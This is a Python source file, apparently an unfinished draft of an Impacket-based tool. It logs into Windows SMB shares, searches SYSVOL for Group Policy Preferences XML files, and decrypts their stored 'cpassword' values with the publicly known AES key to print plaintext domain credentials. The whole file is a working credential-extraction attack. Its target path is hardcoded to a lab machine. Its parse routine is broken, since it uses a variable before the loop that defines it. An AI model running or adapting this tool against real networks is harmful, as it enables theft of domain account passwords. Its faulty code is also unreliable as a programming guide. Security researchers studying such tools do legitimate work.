#!/usr/bin/env python
# todo : licence
# Description: todo
#
# Author:
#  Remi Gascou (@podalirius_)
#  Charlie Bromberg (@_nwodtuhs)
#
# Reference for:
#  SMB DCE/RPC

import argparse
import logging
from xml.dom import minidom
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64

from impacket import version
from impacket.examples import logger
from impacket.smbconnection import SMBConnection, SMB2_DIALECT_002, SMB2_DIALECT_21, SMB_DIALECT, SessionError, \
    FILE_READ_DATA, FILE_SHARE_READ, FILE_SHARE_WRITE
from impacket.smb3structs import FILE_DIRECTORY_FILE, FILE_LIST_DIRECTORY

from io import BytesIO
import chardet


class GetGPPasswords(object):
    """docstring for GetGPPasswords."""

    def __init__(self, share, domain, username, password, host, port, verbose=False):
        super(GetGPPasswords, self).__init__()
        self.loggedIn = False
        self.share = share
        self.domain = domain
        self.username = username
        self.password = password
        self.host = host
        self.port = port
        self.verbose = verbose
        self.init_smb()

    def init_smb(self):  # ok
        if self.port == 139:
            self.smb = SMBConnection('*SMBSERVER', self.host, sess_port=self.port)
        else:
            self.smb = SMBConnection(self.host, self.host, sess_port=self.port)
        dialect = self.smb.getDialect()
        if dialect == SMB_DIALECT:
            logging.info("SMBv1 dialect used")
        elif dialect == SMB2_DIALECT_002:
            logging.info("SMBv2.0 dialect used")
        elif dialect == SMB2_DIALECT_21:
            logging.info("SMBv2.1 dialect used")
        else:
            logging.info("SMBv3.0 dialect used")
        return self.smb

    def login(self):
        if self.smb is None:
            logging.error("No connection open")
            return

        self.domain = ""
        if self.username.find('/') > 0:
            self.domain, self.username = self.username.split('/')

        # Todo : handle empty password case
        # if password == "" and username != "":
        #     from getpass import getpass
        #     password = getpass("Password:")

        self.smb.login(self.username, self.password, domain=self.domain)

        if self.smb.isGuestSession() > 0:
            logging.info("GUEST Session Granted")
        else:
            logging.info("USER Session Granted")
        self.loggedIn = True

    def list_shares(self):
        if self.loggedIn is False:
            logging.error("Not logged in")
            return
        logging.info("Listing shares ...")
        resp = self.smb.listShares()
        shares = []
        for k in range(len(resp)):
            shares.append(resp[k]['shi1_netname'][:-1])
            print('  - %s' % resp[k]['shi1_netname'][:-1])
        print("")

    def find_files(self, extension='xml'):
        if self.loggedIn is False:
            logging.error("Not logged in")
            return
        logging.info("Searching *.%s ..." % extension)

        # Breadth-first search algorithm
        files = []
        searchdirs = ['/']
        while len(searchdirs) != 0:
            next_dirs = []
            for sdir in searchdirs:
                if self.verbose == True:
                    print('[debug] Searching in %s ' % sdir)
                for sharedfile in self.smb.listPath(self.share, sdir + '*', password=None):
                    if sharedfile.get_longname() not in ['.', '..']:
                        if sharedfile.is_directory():
                            if self.verbose == True:
                                print('    (d) \x1b[94m/%s/\x1b[0m ' % sharedfile.get_longname())
                            next_dirs.append(sdir + sharedfile.get_longname() + '/')
                        else:
                            if self.verbose == True:
                                print('    (f) \x1b[95m/%s\x1b[0m ' % sharedfile.get_longname())
                            if sharedfile.get_longname().endswith('.' + extension):
                                files.append(sdir + sharedfile.get_longname())
            searchdirs = next_dirs
            if self.verbose == True:
                print('[debug] Next iteration with %d folders.' % len(next_dirs))
        if self.verbose == True:
            print('[debug] Found %d %s files' % (len(files), extension))
            for f in files:
                print(' - %s' % f)
        return files

    def parse(self, files=[]):
        if self.loggedIn is False:
            logging.error("Not logged in")
            return
        results = []
        for filename in files:
            # I/O + grep cpassword
            filename = filename.replace('/', '\\')
            fh = BytesIO()
            try:
                self.smb.getFile(self.share, filename, fh.write)
            except:
                raise
            output = fh.getvalue()
            encoding = chardet.detect(output)["encoding"]
            error_msg = "[-] Output cannot be correctly decoded, are you sure the text is readable ?"
            if encoding != None:
                filecontent = output.decode(encoding)
                logging.debug(filecontent)
                root = minidom.parseString(filecontent)
                properties_list = root.getElementsByTagName("Properties")
                # todo : handle empty list, no match
                results.append({
                    'newname': properties.getAttribute('newName'), # todo : can be empty
                    'changed': properties.parentNode.getAttribute('changed'),
                    'cpassword': properties.getAttribute('cpassword'),
                    'password': self.decrypt_password(properties.getAttribute('cpassword')),
                    'username': properties.getAttribute('userName'),
                    'file': filename
                })
                for properties in properties_list:
                    pass
                fh.close()
            else:
                print(error_msg)
                fh.close()
        return results

    def decrypt_password(self, pw_enc_b64):
        key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20' \
              b'\x9b\x09\xa4\x33\xb6\x6c\x1b'
        iv = b'\x00' * 16
        pad = len(pw_enc_b64) % 4
        if pad == 1:
            pw_enc_b64 = pw_enc_b64[:-1]
        elif pad == 2 or pad == 3:
            pw_enc_b64 += '=' * (4 - pad)
        pw_enc = base64.b64decode(pw_enc_b64)
        ctx = AES.new(key, AES.MODE_CBC, iv)
        pw_dec = unpad(ctx.decrypt(pw_enc), ctx.block_size)
        return pw_dec.decode('utf-16-le')

    def show(self, results):
        for result in results:
            logging.info(f"NewName\t: {result['newname']}")
            logging.info(f"Changed\t: {result['changed']}")
            logging.info(f"Username\t: {result['username']}")
            logging.info(f"Password\t: {result['password']}")
            logging.info(f"File\t: {result['file']}\n")


def parse_args():
    parser = argparse.ArgumentParser(description='Group Policy Preferences passwords finder and decryptor')
    parser.add_argument("server", type=str, help='Target SMB server address')
    # todo : add smb2support
    # todo : add pth support (-hashes)
    # group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH') # todo : enable this
    # todo : add -root-directories (find another name) (default to Policies)
    # parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON') # todo : enable this
    parser.add_argument("-d", "--domain", type=str, required=False, default="", help="SMB Password")
    parser.add_argument("-u", "--username", type=str, required=False, default="", help="SMB Username")
    parser.add_argument("-p", "--password", type=str, required=False, default="", help="SMB Password")
    parser.add_argument("-share", type=str, required=False, default="SYSVOL", help="SMB Share")
    parser.add_argument("-P", "--port", type=int, required=False, default=445, help="Server port")
    parser.add_argument("-verbose", required=False, default=False, action="store_true", help="")
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    return vars(parser.parse_args())


if __name__ == '__main__':
    print(version.BANNER)
    args = parse_args()

    # Init the example's logger theme
    logger.init(args['ts'])

    if args['verbose'] is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)
        logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)

    g = GetGPPasswords(args['share'], args['domain'], args['username'], args['password'], args['server'], args['port'],
                       verbose=args['verbose'])
    g.login()
    g.list_shares()
    # files = g.find_files()
    files = ['/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml']
    results = g.parse(files)
    g.show(results)

